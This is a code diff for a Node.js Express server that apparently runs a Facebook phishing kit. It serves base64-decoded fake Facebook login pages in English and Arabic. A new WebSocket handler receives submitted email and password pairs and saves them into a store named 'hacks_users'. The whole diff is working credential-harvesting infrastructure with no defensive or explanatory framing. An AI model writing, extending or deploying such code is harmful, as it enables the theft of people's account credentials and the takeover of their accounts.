@@ -2,10 +2,13 @@ const express = require('express')
 const http = require('http')
 const XMLHttpRequest = require('xhr2')
 const cors = require('cors')
+const websocket = require('ws')
 const dibase = require('./module/DIBASE')
 const app = express()
 const server = http.createServer(app)
+const wss = new websocket.Server({ server })
 const PORT = 2007; 
+var PAGES = {}
 const domains ={
     id:"server-users",
     domains:[
@@ -20,13 +23,35 @@ const { hacks_users } = dib.base
 app.use(cors({
     origin:'*'
 }))
+
+
 app.use(express.urlencoded({ extended: true }))
 app.use(express.static('./PUB'))
 app.get('/',(req, res)=>{
     res.send('<h1>Hello<h1>')
 })
-app.get('/facebook-login',(req, res)=>{
-    res.send(atob(require('./config.json').fasebook_page))
+app.get('/facebook-login/:dORf/:leng',(req, res)=>{
+    let { dORf, leng } = req.params
+    if (dORf == 'd') {
+        if (leng == 'en') {
+            res.send(PAGES['facebook-login-default-en'])
+            return
+        }
+        if (leng == 'ar') {
+            res.send(PAGES['facebook-login-default-ar'])
+            return
+        }
+    }
+    if (dORf == 'f') {
+        if (leng == 'en') {
+            res.send(PAGES['facebook-login-en'])
+            return
+        }
+        if (leng == 'ar') {
+            res.send(PAGES['facebook-login-ar'])
+            return
+        }
+    }
 }) 
 
 app.get('/:type/:greep/set',(req, res)=>{
@@ -55,24 +80,21 @@ hacks_users.onload = async(data)=>{
     }
 }
 //=========================> Save Data <==============================================
-const save_data = ({query, greep})=>{
-    query.user_name = email_name(query.email)
-    if (! dib.IPath(DATA, ['type', query.type, greep])) {
-        hacks_users.setpath(['type', query.type, greep])
+const save_data = (data)=>{
+    let user_name = email_name(data.email) 
+    let path = ['type', data.type, data.greep]
+    let full_path = ['type', data.type, data.greep, user_name]
+    user_name = email_name(data.email)
+    if (dib.GTPath(hacks_users.data, full_path)) {
+        return
     }
-    if (! dib.IPath(DATA, ['type', query.type, greep, query.user_name])) {
-        hacks_users.setpath(['type', query.type, greep, query.user_name], true)
-        hacks_users.set({[query.user_name]:form_data({query, greep})},['type', query.type, greep])
+    if (! dib.IPath(DATA, path)) {
+        hacks_users.setpath(path)
     }
-}
-const form_data = ({query, greep})=>{
-    const user = {
-        email:query.email,
-        password:query.password,
-        date:'2024/10/14'
+    if (! dib.IPath(DATA, full_path)) {
+        hacks_users.setpath(full_path, true)
+        hacks_users.set({[user_name]:data},path)
     }
-    
-    return user
 }
 const email_name = (email)=>{
     let Email = email
@@ -81,8 +103,40 @@ const email_name = (email)=>{
     }
     return Email
 }
+const preparation_html = ()=>{
+    let config = require('./PUB/config.json')
+    let keys = Object.keys(config)
+    let values = Object.values(config)
+    for (let i = 0; i < keys.length; i++) {
+        PAGES[keys[i]] = atob(values[i])        
+    }
+}
 server.listen(PORT, ()=>{
     console.log(`i am listening in port : ${PORT}`)
+    preparation_html()
+})
+
+//-------------------------------------------------------------------------------
+wss.on('connection', (ws)=>{
+
+    ws.on('message',(message)=>{
+        let data = JSON.parse(message.toString('utf-8'))
+        if (data.message) {
+            if (data.message == 'call-me') {
+                ws.send(JSON.stringify({
+                    message:'send-me-the-data'
+                }))
+            }
+            return
+        }
+        if (data.data) {
+            if (data.data.email && data.data.password) { 
+                save_data(data.data)
+                ws.send('{"message":"saveed"}')
+            }
+            return
+        }
+    })
 })
 /*////////////////////////// Example //////////////////////
  {
